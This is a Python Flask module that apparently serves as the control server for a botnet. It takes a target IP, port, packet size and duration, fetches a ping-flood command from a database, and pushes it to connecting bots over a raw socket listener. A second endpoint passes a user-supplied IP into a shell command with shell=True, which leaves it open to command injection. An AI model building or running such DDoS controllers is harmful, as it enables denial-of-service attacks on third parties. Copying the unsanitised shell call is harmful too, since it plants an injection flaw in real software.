from flask import Blueprint, request
import signal
import subprocess
import time
import socket
import threading
from app import db
import sys
import os

ddosAttack = Blueprint("ddosAttack", __name__, url_prefix="/ddosAttack")

@ddosAttack.post("/")
def DDOSAttack():
    data = request.get_json()
    ipAddress = data["ipAddress"]
    portNumber = data["portNumber"]
    packetSize = data["packetSize"]
    attackType = data["attackType"]
    duration = data["duration"]

    command = getCommand("DDOS", "PINGFLOOD")
    command = command.format(
        attackType = attackType,
        packetSize = packetSize,
        portNumber = portNumber,
        ipAddress = ipAddress,
        duration = duration)

    # launch dos on bots using a seperate thread
    bots = threading.Thread(target=botnet, args=(command, duration))
    bots.start()
    bots.join()

    return ""

@ddosAttack.post("/latency")
def checkLatency():
    data = request.get_json()
    ipAddress = data["ipAddress"]

    command = getCommand("PING", "LATENCY")
    command = command.format(ipAddress = ipAddress)

    pingCommand = subprocess.Popen(command, stdout=subprocess.PIPE, text=True, shell=True)
    output, _ = pingCommand.communicate()  # Capture the output and wait for the process to finish

    lines = output.splitlines()
    line = lines[1]

    if "time" in line:
        return '[PING SUCCESS] ' + line
    else:
        return '[PING FAILED] ' + line
    
def send_commands(conn, command):
    # finalCommand = f"{command} --duration {duration}"

    if len(str.encode(command)) > 0:
        conn.send(str.encode(command))
        client_response = str(conn.recv(1024), "utf-8")
        print(client_response, end="")

def botnet(command, duration):
    bindIp = getIpAddress()
    bindPort = 1046
    servAdd = (bindIp, bindPort)
    duration = int(duration)
    
    # create socket to listen
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((servAdd))
    server.listen(5)
    print ("[*] listening on {}:{}".format(bindIp, bindPort))

    max_connections = 2  # Maximum number of concurrent connections

    threads = [] # Create a list to keep track of threads

    start_time = time.time()  # Record the start time

    while (time.time() - start_time) < duration:
        try:
            server.settimeout(duration - (time.time() - start_time))
            conn, addr = server.accept() # accept the connection
            
            # Create a new thread to handle the connection
            client_thread = threading.Thread(target=handleClient, args=(conn, addr, command))
            client_thread.start()
            
            threads.append(client_thread) # Store the thread in the list
        except socket.timeout:
            pass

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

def handleClient(conn, addr, command):
    # Handle the connection
    print('accepted connection from {} and port {}'.format(addr[0], addr[1]))
    sys.stdout.flush()  # Add this line
    send_commands(conn, command)
    conn.close()

def getIpAddress():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def getCommand(operation, type):
    collection = db["commands"]
    x = collection.find_one({
        "operation" : operation,
        "type": type,
        })

    return x["command"]